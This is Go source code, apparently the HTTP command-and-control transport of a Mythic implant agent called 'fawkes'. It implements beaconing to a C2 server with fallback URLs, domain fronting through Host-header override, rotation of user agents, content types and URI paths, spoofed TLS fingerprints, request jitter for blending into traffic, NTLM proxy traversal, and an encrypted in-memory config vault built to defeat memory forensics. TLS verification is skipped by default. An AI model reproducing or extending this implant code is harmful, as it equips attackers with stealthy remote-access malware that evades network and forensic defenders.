package http

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"

	"fawkes/pkg/resilience"
	"fawkes/pkg/structs"
)

// configVault holds AES-256-GCM encrypted C2 configuration. Sensitive fields
// (C2 URL, encryption key, user agent, endpoints) are stored encrypted and
// only decrypted into local variables for the duration of each HTTP operation.
// This reduces the plaintext exposure window from "entire process lifetime"
// to "single HTTP request duration" (~milliseconds).
type configVault struct {
	key  []byte // AES-256-GCM key (random, generated at SealConfig)
	blob []byte // Encrypted JSON of sensitiveConfig
}

// sensitiveConfig holds the C2 configuration fields that should not persist
// as plaintext in memory. These reveal C2 infrastructure and enable traffic decryption.
type sensitiveConfig struct {
	BaseURL            string            `json:"b"`
	FallbackURLs       []string          `json:"f,omitempty"`
	UserAgent          string            `json:"a"`
	UserAgentPool      []string          `json:"ap,omitempty"`
	EncryptionKey      string            `json:"k"`
	CallbackUUID       string            `json:"c"`
	HostHeader         string            `json:"h"`
	GetEndpoint        string            `json:"g"`
	PostEndpoint       string            `json:"p"`
	CustomHeaders      map[string]string `json:"x,omitempty"`
	ContentTypes       []string          `json:"ct,omitempty"`
	MTLSCertPEM        string            `json:"mc,omitempty"` // PEM client certificate for mTLS
	MTLSKeyPEM         string            `json:"mk,omitempty"` // PEM client private key for mTLS
	GetPaths           []string          `json:"gp,omitempty"` // Traffic profile GET path pool
	PostPaths          []string          `json:"pp,omitempty"` // Traffic profile POST path pool
	RequestJitterMinMs int               `json:"jn,omitempty"` // Min request jitter (ms)
	RequestJitterMaxMs int               `json:"jx,omitempty"` // Max request jitter (ms)
	RequestWrap        string            `json:"rw,omitempty"` // JSON template for wrapping requests
	ResponseWrap       string            `json:"ru,omitempty"` // JSON template for unwrapping responses
}

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	GetEndpoint   string
	PostEndpoint  string
	HostHeader    string            // Override Host header for domain fronting
	CustomHeaders map[string]string // Additional HTTP headers from C2 profile
	ContentTypes  []string          // Content-Type rotation pool for request body
	UserAgentPool []string          // User-Agent rotation pool (if set, overrides single UserAgent)
	GetPaths           []string // Traffic profile GET path rotation pool
	PostPaths          []string // Traffic profile POST path rotation pool
	RequestJitterMinMs int      // Minimum per-request jitter (ms) for traffic blending
	RequestJitterMaxMs int      // Maximum per-request jitter (ms) for traffic blending
	RequestWrap        string   // JSON template with {DATA} for wrapping outgoing POST bodies
	ResponseWrap       string   // JSON template with {DATA} for unwrapping server responses
	client             *http.Client
	CallbackUUID       string        // Store callback UUID from initial checkin
	ctIndex            atomic.Uint32 // Round-robin index for Content-Type rotation
	uaIndex            atomic.Uint32 // Round-robin index for User-Agent rotation
	pathIndex          atomic.Uint32 // Round-robin index for URI path rotation

	// Fallback C2 URLs for automatic failover when primary is unreachable.
	FallbackURLs []string
	// activeURLIdx tracks which URL in the list is currently being used.
	// 0 = primary (BaseURL), 1+ = fallback URLs. Updated on failover.
	// Accessed atomically — makeRequest may be called concurrently from
	// multiple PostResponse goroutines and the GetTasking loop.
	activeURLIdx atomic.Int32

	// Domain health tracker — tracks per-URL health for intelligent failover.
	// Skips known-unhealthy fallback URLs and periodically retries them.
	tracker *resilience.DomainTracker

	// Config vault — encrypted storage for sensitive C2 fields.
	// When active, the struct fields above are zeroed and all access
	// goes through getConfig() which decrypts on demand.
	vault *configVault

	// P2P delegate hooks — set by main.go when TCP P2P children are supported.
	// GetDelegatesOnly returns only pending delegate messages (no edges). Used by GetTasking.
	// GetDelegatesAndEdges returns delegates AND edge notifications. Used by PostResponse.
	// HandleDelegates routes incoming delegate messages from Mythic to the appropriate children.
	GetDelegatesOnly     func() []structs.DelegateMessage
	GetDelegatesAndEdges func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
	HandleDelegates      func(delegates []structs.DelegateMessage)

	// Rpfwd hooks — set by main.go for reverse port forward message routing.
	GetRpfwdOutbound func() []structs.SocksMsg
	HandleRpfwd      func(msgs []structs.SocksMsg)

	// Interactive hooks — set by main.go for PTY/terminal bidirectional streaming.
	GetInteractiveOutbound func() []structs.InteractiveMsg
	HandleInteractive      func(msgs []structs.InteractiveMsg)
}

// ProfileConfig holds the configuration for creating an HTTP C2 profile.
type ProfileConfig struct {
	BaseURL        string
	UserAgent      string
	EncryptionKey  string
	MaxRetries     int
	SleepInterval  int
	Jitter         int
	Debug          bool
	GetEndpoint    string
	PostEndpoint   string
	HostHeader     string
	ProxyURL       string
	ProxyUser      string
	ProxyPass      string
	ProxyDomain    string
	TLSVerify      string
	TLSFingerprint string
	MTLSCertPEM    string
	MTLSKeyPEM     string
	FallbackURLs   []string
	ContentTypes   []string
	RecoverySeconds int
}

// NewHTTPProfile creates a new HTTP profile from the given configuration.
// Proxy behavior: if ProxyDomain is set, NTLM auth is used for the proxy.
// If ProxyDomain is empty and ProxyUser is set, Basic auth is used.
// If ProxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY).
func NewHTTPProfile(cfg ProfileConfig) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       cfg.BaseURL,
		UserAgent:     cfg.UserAgent,
		EncryptionKey: cfg.EncryptionKey,
		MaxRetries:    cfg.MaxRetries,
		SleepInterval: cfg.SleepInterval,
		Jitter:        cfg.Jitter,
		Debug:         cfg.Debug,
		GetEndpoint:   cfg.GetEndpoint,
		PostEndpoint:  cfg.PostEndpoint,
		HostHeader:    cfg.HostHeader,
		FallbackURLs:  cfg.FallbackURLs,
		ContentTypes:  cfg.ContentTypes,
		tracker:       resilience.NewTracker(1+len(cfg.FallbackURLs), 3, cfg.RecoverySeconds),
	}

	tlsConfig := buildTLSConfig(cfg.TLSVerify)

	if cfg.MTLSCertPEM != "" && cfg.MTLSKeyPEM != "" {
		if cert, err := tls.X509KeyPair([]byte(cfg.MTLSCertPEM), []byte(cfg.MTLSKeyPEM)); err == nil {
			tlsConfig.Certificates = []tls.Certificate{cert}
		}
	}

	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	useNTLMProxy := cfg.ProxyURL != "" && cfg.ProxyUser != "" && cfg.ProxyDomain != ""

	if useNTLMProxy {
		proxyU, _ := url.Parse(cfg.ProxyURL)
		proxyAddr := proxyU.Host
		if _, _, err := net.SplitHostPort(proxyAddr); err != nil {
			proxyAddr = net.JoinHostPort(proxyAddr, "8080")
		}
		transport.DialTLSContext = ntlmProxyTLSDialer(proxyAddr, cfg.ProxyDomain, cfg.ProxyUser, cfg.ProxyPass, tlsConfig, cfg.TLSFingerprint)
		transport.TLSClientConfig = nil
		transport.Proxy = nil
	} else if cfg.ProxyURL != "" {
		if proxyU, err := url.Parse(cfg.ProxyURL); err == nil {
			if cfg.ProxyUser != "" && proxyU.User == nil {
				if cfg.ProxyPass != "" {
					proxyU.User = url.UserPassword(cfg.ProxyUser, cfg.ProxyPass)
				} else {
					proxyU.User = url.User(cfg.ProxyUser)
				}
			}
			transport.Proxy = http.ProxyURL(proxyU)
		}
	} else {
		transport.Proxy = systemProxyFunc()
	}

	if !useNTLMProxy {
		if isRotateFingerprint(cfg.TLSFingerprint) {
			transport.DialTLSContext = buildRotatingDialer(tlsConfig)
			transport.TLSClientConfig = nil
		} else if helloID, ok := tlsFingerprintID(cfg.TLSFingerprint); ok {
			transport.DialTLSContext = buildUTLSTransportDialer(helloID, tlsConfig)
			transport.TLSClientConfig = nil
		}
	}

	var rt http.RoundTripper = transport
	if transport.DialTLSContext != nil {
		rt = newH2AwareTransport(transport, transport.DialTLSContext)
	} else if strings.HasPrefix(cfg.BaseURL, "https://") {
		transport.ForceAttemptHTTP2 = true
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: rt,
	}

	return profile
}

// SetTimeout configures the HTTP client timeout in seconds.
func (h *HTTPProfile) SetTimeout(seconds int) {
	h.client.Timeout = time.Duration(seconds) * time.Second
}

// SealConfig encrypts all sensitive C2 configuration fields into an AES-256-GCM
// vault and zeros the plaintext struct fields. After sealing, fields are only
// decrypted on-demand for the duration of each HTTP operation. This reduces the
// memory forensics exposure window from the entire process lifetime to individual
// HTTP request durations (~milliseconds).
func (h *HTTPProfile) SealConfig() error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return fmt.Errorf("config vault key generation failed: %w", err)
	}

	cfg := &sensitiveConfig{
		BaseURL:            h.BaseURL,
		FallbackURLs:       h.FallbackURLs,
		UserAgent:          h.UserAgent,
		UserAgentPool:      h.UserAgentPool,
		EncryptionKey:      h.EncryptionKey,
		CallbackUUID:       h.CallbackUUID,
		HostHeader:         h.HostHeader,
		GetEndpoint:        h.GetEndpoint,
		PostEndpoint:       h.PostEndpoint,
		CustomHeaders:      h.CustomHeaders,
		ContentTypes:       h.ContentTypes,
		GetPaths:           h.GetPaths,
		PostPaths:          h.PostPaths,
		RequestJitterMinMs: h.RequestJitterMinMs,
		RequestJitterMaxMs: h.RequestJitterMaxMs,
		RequestWrap:        h.RequestWrap,
		ResponseWrap:       h.ResponseWrap,
	}

	plaintext, err := json.Marshal(cfg)
	if err != nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault marshal failed: %w", err)
	}

	blob := vaultEncrypt(key, plaintext)
	vaultZeroBytes(plaintext)
	if blob == nil {
		vaultZeroBytes(key)
		return fmt.Errorf("config vault encryption failed")
	}

	h.vault = &configVault{key: key, blob: blob}

	// Zero plaintext struct fields — all access now goes through the vault
	h.BaseURL = ""
	h.FallbackURLs = nil
	h.UserAgent = ""
	h.EncryptionKey = ""
	h.CallbackUUID = ""
	h.HostHeader = ""
	h.GetEndpoint = ""
	h.PostEndpoint = ""
	h.CustomHeaders = nil
	h.ContentTypes = nil
	h.UserAgentPool = nil
	h.GetPaths = nil
	h.PostPaths = nil
	h.RequestJitterMinMs = 0
	h.RequestJitterMaxMs = 0
	h.RequestWrap = ""
	h.ResponseWrap = ""

	return nil
}

// getConfig returns the current C2 configuration. If the vault is active,
// decrypts and returns the config from the vault. Otherwise returns the
// plaintext struct fields directly. Each call creates an independent copy —
// safe for concurrent use from multiple goroutines.
func (h *HTTPProfile) getConfig() *sensitiveConfig {
	if h.vault == nil {
		return &sensitiveConfig{
			BaseURL:            h.BaseURL,
			FallbackURLs:       h.FallbackURLs,
			UserAgent:          h.UserAgent,
			UserAgentPool:      h.UserAgentPool,
			EncryptionKey:      h.EncryptionKey,
			CallbackUUID:       h.CallbackUUID,
			HostHeader:         h.HostHeader,
			GetEndpoint:        h.GetEndpoint,
			PostEndpoint:       h.PostEndpoint,
			CustomHeaders:      h.CustomHeaders,
			ContentTypes:       h.ContentTypes,
			GetPaths:           h.GetPaths,
			PostPaths:          h.PostPaths,
			RequestJitterMinMs: h.RequestJitterMinMs,
			RequestJitterMaxMs: h.RequestJitterMaxMs,
			RequestWrap:        h.RequestWrap,
			ResponseWrap:       h.ResponseWrap,
		}
	}

	plaintext := vaultDecrypt(h.vault.key, h.vault.blob)
	if plaintext == nil {
		return nil
	}

	var cfg sensitiveConfig
	if err := json.Unmarshal(plaintext, &cfg); err != nil {
		vaultZeroBytes(plaintext)
		return nil
	}
	vaultZeroBytes(plaintext)
	return &cfg
}

// IsSealed returns true if the config vault is active (fields are encrypted).
func (h *HTTPProfile) IsSealed() bool {
	return h.vault != nil
}

// UpdateCallbackUUID updates the callback UUID in the vault (or struct field
// if vault is not active). Called after Checkin to store the server-assigned UUID.
func (h *HTTPProfile) UpdateCallbackUUID(uuid string) {
	if h.vault != nil {
		cfg := h.getConfig()
		if cfg != nil {
			cfg.CallbackUUID = uuid
			plaintext, err := json.Marshal(cfg)
			if err == nil {
				newBlob := vaultEncrypt(h.vault.key, plaintext)
				vaultZeroBytes(plaintext)
				if newBlob != nil {
					vaultZeroBytes(h.vault.blob)
					h.vault.blob = newBlob
				}
			}
		}
		return
	}
	h.CallbackUUID = uuid
}

// buildTLSConfig creates a TLS configuration based on the verification mode.
// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
func buildTLSConfig(tlsVerify string) *tls.Config {
	switch {
	case tlsVerify == "system-ca":
		// Use the operating system's certificate trust store
		return &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		}
	case strings.HasPrefix(tlsVerify, "pinned:"):
		// Pin to a specific certificate SHA-256 fingerprint
		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
		expectedHash, err := hex.DecodeString(fingerprint)
		if err != nil || len(expectedHash) != 32 {
			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
			return &tls.Config{InsecureSkipVerify: true}
		}
		return &tls.Config{
			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
			MinVersion:         tls.VersionTLS12,
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if len(rawCerts) == 0 {
					return fmt.Errorf("no certificates presented")
				}
				// Hash the leaf certificate's raw DER bytes
				hash := sha256.Sum256(rawCerts[0])
				if !bytes.Equal(hash[:], expectedHash) {
					return fmt.Errorf("certificate fingerprint mismatch")
				}
				return nil
			},
		}
	default:
		// "none" or unrecognized — skip verification (backward compatible default)
		return &tls.Config{InsecureSkipVerify: true}
	}
}

// GetCallbackUUID returns the callback UUID assigned by Mythic after checkin.
// Reads from the vault if config is sealed.
func (h *HTTPProfile) GetCallbackUUID() string {
	if h.vault != nil {
		if cfg := h.getConfig(); cfg != nil {
			return cfg.CallbackUUID
		}
	}
	return h.CallbackUUID
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID.
// Reads from the provided config to avoid accessing zeroed struct fields.
func (h *HTTPProfile) getActiveUUID(agent *structs.Agent, cfg *sensitiveConfig) string {
	if cfg != nil && cfg.CallbackUUID != "" {
		return cfg.CallbackUUID
	}
	if h.CallbackUUID != "" {
		return h.CallbackUUID
	}
	return agent.PayloadUUID
}
